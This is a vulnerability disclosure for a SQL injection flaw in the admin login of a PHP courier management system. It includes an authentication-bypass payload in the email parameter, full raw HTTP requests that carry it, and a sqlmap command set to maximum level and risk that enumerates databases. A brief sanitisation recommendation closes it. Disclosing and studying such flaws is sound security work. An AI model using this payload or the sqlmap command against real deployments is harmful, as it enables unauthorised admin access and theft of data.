# courier management system - SQL Injection (Admin Login)

### Vendor Homepage:

> [https://www.sourcecodester.com](https://www.sourcecodester.com/)

### Software Link:

> [courier management system](https://www.sourcecodester.com/php/16848/best-courier-management-system-project-php.html)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /ajax.php?action=login

> One parameters `email`  within admin login mechanism are vulnerable to SQL Injection.

In the admin_class.php code of the login process, it can be seen that no validation is performed on the email parameter and it is directly spliced into the SQL statement, leading to the possibility of SQL injection.

![courier1.png](https://github.com/baineoli/CVE/blob/main/2024/images/courier1.png?raw=true)

### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### Manual Exploitation

The payload `' and 1=1-- -` can be used to bypass authentication within admin login page.

The input tag detects the type of email, so add `' and 1=1-- - `after capturing the packet, then release the packet and refresh the page.

```
POST /ajax.php?action=login HTTP/1.1
Host: 192.168.31.254
Content-Length: 50
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.31.254
Referer: http://192.168.31.254/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hpb2vs2p042l678hnd8o8g41gm
Connection: keep-alive

email=n%40admin.com'+and+1%3D1--+-&password=123456
```



### SQLMap

Save the following request to `admin_login.txt`:

```
POST /ajax.php?action=login HTTP/1.1
Host: 192.168.31.254
Content-Length: 50
Accept: */*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.31.254
Referer: http://192.168.31.254/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=hpb2vs2p042l678hnd8o8g41gm
Connection: keep-alive

email=n%40admin.com'&password=123456
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
python sqlmap.py -r admin_login.txt --level 5 --risk 3 --batch --dbs
```

## Recommendations

When using this courier management system, the application code must be updated to ensure sanitization of user input and proper restrictions on special characters.